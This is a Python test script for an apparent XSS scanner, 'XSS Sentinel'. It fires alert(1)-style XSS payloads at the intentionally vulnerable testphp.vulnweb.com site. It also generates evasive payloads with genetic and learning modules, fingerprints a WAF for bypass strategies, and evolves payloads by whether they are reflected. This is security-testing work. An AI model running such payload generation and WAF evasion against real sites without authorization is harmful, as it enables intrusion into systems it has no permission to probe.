#!/usr/bin/env python3
"""
XSS Sentinel v2.0 Neural Engine - Real Site Test
Tests the neural engine against http://testphp.vulnweb.com/
"""

import sys
import os
import time
import requests
from urllib.parse import quote, urljoin

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

def print_banner():
    print("=" * 70)
    print("XSS SENTINEL v2.0 - REAL SITE TEST")
    print("Testing against: http://testphp.vulnweb.com/")
    print("=" * 70)
    print("\n[INFO] This is a legitimate test site provided by Acunetix")
    print("[INFO] It is intentionally vulnerable for testing security tools\n")

def test_basic_payloads():
    """Test basic XSS payloads"""
    print("\n[TEST 1] Basic XSS Payload Testing")
    print("-" * 70)
    
    target_url = "http://testphp.vulnweb.com/search.php"
    test_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
    ]
    
    vulnerable = []
    
    for payload in test_payloads:
        try:
            # Test in search parameter
            params = {'testquery': payload}
            response = requests.get(target_url, params=params, timeout=10)
            
            # Check if payload is reflected
            if payload in response.text or payload.replace("'", "&#39;") in response.text:
                print(f"  [VULN] Payload reflected: {payload[:50]}")
                vulnerable.append(payload)
            else:
                print(f"  [OK] Payload filtered: {payload[:50]}")
        except Exception as e:
            print(f"  [ERROR] {payload[:50]}: {e}")
    
    print(f"\n[RESULT] {len(vulnerable)}/{len(test_payloads)} basic payloads reflected")
    return vulnerable

def test_neural_engine_payloads():
    """Test neural engine generated payloads"""
    print("\n[TEST 2] Neural Engine Payload Testing")
    print("-" * 70)
    
    from xss_sentinel.neural_engine.integration import NeuralEngineIntegration
    
    try:
        # Initialize neural engine
        print("Initializing Neural Engine...")
        engine = NeuralEngineIntegration(
            enable_genetic=True,
            enable_gan=False,  # Skip GAN for faster testing
            enable_rl=True
        )
        
        # Base payloads
        base_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
        ]
        
        # Context
        context = {
            'context_type': 'url_parameter',
            'waf_type': 'unknown'
        }
        
        # Generate advanced payloads
        print("Generating advanced payloads with Neural Engine...")
        advanced_payloads = engine.generate_advanced_payloads(
            base_payloads,
            context,
            'http://testphp.vulnweb.com/',
            count=20
        )
        
        print(f"Generated {len(advanced_payloads)} advanced payloads")
        
        # Test against target
        target_url = "http://testphp.vulnweb.com/search.php"
        vulnerable = []
        
        print("\nTesting neural engine payloads...")
        for i, payload in enumerate(advanced_payloads[:15], 1):  # Test first 15
            try:
                params = {'testquery': payload}
                response = requests.get(target_url, params=params, timeout=10)
                
                # Check reflection
                if payload in response.text or any(part in response.text for part in payload.split() if len(part) > 5):
                    print(f"  [{i}] [VULN] Reflected: {payload[:60]}")
                    vulnerable.append(payload)
                else:
                    print(f"  [{i}] [OK] Filtered: {payload[:60]}")
                
                time.sleep(0.5)  # Rate limiting
                
            except Exception as e:
                print(f"  [{i}] [ERROR] {payload[:50]}: {e}")
        
        print(f"\n[RESULT] {len(vulnerable)}/{min(15, len(advanced_payloads))} neural payloads reflected")
        
        # Learn from results
        for payload in vulnerable:
            engine.learn_from_result(payload, context, success=True, details={})
        
        stats = engine.get_statistics()
        print(f"\n[LEARNING] Statistics:")
        print(f"  Successful payloads: {stats['successful_payloads']}")
        print(f"  Success rate: {stats['success_rate']:.1%}")
        
        return vulnerable
        
    except Exception as e:
        print(f"[ERROR] Neural engine test failed: {e}")
        import traceback
        traceback.print_exc()
        return []

def test_waf_fingerprinting():
    """Test WAF fingerprinting"""
    print("\n[TEST 3] WAF Fingerprinting")
    print("-" * 70)
    
    from xss_sentinel.neural_engine.waf_fingerprinter import WAFFingerprinter
    
    fingerprinter = WAFFingerprinter()
    
    target_url = "http://testphp.vulnweb.com/"
    
    print(f"Fingerprinting WAF for: {target_url}")
    result = fingerprinter.fingerprint_waf(target_url)
    
    print(f"\n[RESULT] WAF Detection:")
    print(f"  Detected WAF: {result['detected_waf'] or 'None'}")
    print(f"  Confidence: {result['confidence']:.2f}")
    print(f"  Bypass Strategies: {result['bypass_strategies']}")
    
    return result

def test_context_prediction():
    """Test context prediction"""
    print("\n[TEST 4] Context Prediction")
    print("-" * 70)
    
    from xss_sentinel.neural_engine.context_predictor import ContextPredictor
    
    predictor = ContextPredictor()
    
    # Get a page to analyze
    try:
        response = requests.get("http://testphp.vulnweb.com/search.php?testquery=XSS_TEST_123", timeout=10)
        html = response.text
        
        # Analyze context
        context = predictor.analyze_context(html, "XSS_TEST_123")
        
        print(f"[RESULT] Context Analysis:")
        print(f"  Context Type: {context.context_type}")
        print(f"  Confidence: {context.confidence:.2f}")
        print(f"  Filters Detected: {context.filters_detected}")
        print(f"  Encodings Required: {context.encoding_required}")
        
        # Generate context-aware payloads
        payloads = predictor.generate_context_payloads(context, count=3)
        print(f"\n  Suggested Payloads:")
        for i, payload in enumerate(payloads, 1):
            print(f"    {i}. {payload[:60]}")
        
        return context
        
    except Exception as e:
        print(f"[ERROR] Context prediction failed: {e}")
        return None

def test_genetic_evolution():
    """Test genetic algorithm evolution"""
    print("\n[TEST 5] Genetic Algorithm Evolution")
    print("-" * 70)
    
    from xss_sentinel.neural_engine.genetic_mutator import GeneticPayloadMutator
    
    mutator = GeneticPayloadMutator(population_size=20, mutation_rate=0.3)
    
    # Fitness function based on reflection
    target_url = "http://testphp.vulnweb.com/search.php"
    
    def fitness_func(payload: str) -> float:
        try:
            params = {'testquery': payload}
            response = requests.get(target_url, params=params, timeout=5)
            
            # Check if reflected
            if payload in response.text:
                return 1.0
            elif any(part in response.text for part in payload.split() if len(part) > 5):
                return 0.7
            else:
                return 0.1
        except:
            return 0.0
    
    seeds = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
    
    print("Evolving payloads (2 generations)...")
    evolved = mutator.evolve_population(seeds, fitness_func, generations=2)
    
    print(f"\n[RESULT] Top 5 Evolved Payloads:")
    for i, gene in enumerate(evolved[:5], 1):
        print(f"  {i}. Fitness: {gene.fitness:.3f} | {gene.payload[:60]}")
    
    return evolved

def main():
    """Run all tests"""
    print_banner()
    
    results = {
        'basic_payloads': [],
        'neural_payloads': [],
        'waf_detection': None,
        'context_analysis': None,
        'genetic_evolution': []
    }
    
    try:
        # Test 1: Basic payloads
        results['basic_payloads'] = test_basic_payloads()
        time.sleep(1)
        
        # Test 2: Neural engine payloads
        results['neural_payloads'] = test_neural_engine_payloads()
        time.sleep(1)
        
        # Test 3: WAF fingerprinting
        results['waf_detection'] = test_waf_fingerprinting()
        time.sleep(1)
        
        # Test 4: Context prediction
        results['context_analysis'] = test_context_prediction()
        time.sleep(1)
        
        # Test 5: Genetic evolution
        results['genetic_evolution'] = test_genetic_evolution()
        
    except KeyboardInterrupt:
        print("\n\n[INFO] Test interrupted by user")
    except Exception as e:
        print(f"\n[ERROR] Test failed: {e}")
        import traceback
        traceback.print_exc()
    
    # Final summary
    print("\n" + "=" * 70)
    print("[SUMMARY] TEST RESULTS")
    print("=" * 70)
    
    print(f"\nBasic Payloads: {len(results['basic_payloads'])} vulnerable")
    print(f"Neural Engine Payloads: {len(results['neural_payloads'])} vulnerable")
    
    if results['waf_detection']:
        print(f"WAF Detected: {results['waf_detection']['detected_waf'] or 'None'}")
    
    if results['context_analysis']:
        print(f"Context Type: {results['context_analysis'].context_type}")
    
    print(f"Genetic Evolution: {len(results['genetic_evolution'])} payloads evolved")
    
    total_vulnerable = len(results['basic_payloads']) + len(results['neural_payloads'])
    print(f"\n[RESULT] Total Vulnerable Payloads Found: {total_vulnerable}")
    
    if total_vulnerable > 0:
        print("\n[SUCCESS] XSS vulnerabilities detected!")
        print("The neural engine successfully identified XSS injection points.")
    else:
        print("\n[INFO] No obvious XSS reflection detected.")
        print("This could mean:")
        print("  - Payloads are being filtered/sanitized")
        print("  - Different injection points need testing")
        print("  - Payloads need different encoding")
    
    print("\n" + "=" * 70)
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
